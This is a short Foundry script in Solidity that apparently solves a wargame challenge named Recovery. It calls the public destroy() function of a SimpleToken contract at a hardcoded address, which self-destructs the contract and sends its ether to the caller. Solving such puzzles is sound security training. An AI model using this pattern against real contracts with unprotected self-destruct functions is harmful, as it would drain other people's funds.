// SPDX-License-Identifier: MIT

pragma solidity 0.8.24;

import {Script, console} from "forge-std/Script.sol";
import {Recovery, SimpleToken} from "src/Recovery.sol";

contract Solve is Script {
    Recovery recovery;
    SimpleToken token;

    function run() external {
        token = SimpleToken(payable(0xC31d24E5D7805Eb0EB95EaA21CaDa6905E9E52bc));
        vm.startBroadcast();
        token.destroy(payable(msg.sender));
        vm.stopBroadcast();
        console.log(address(token).balance);
    }
}
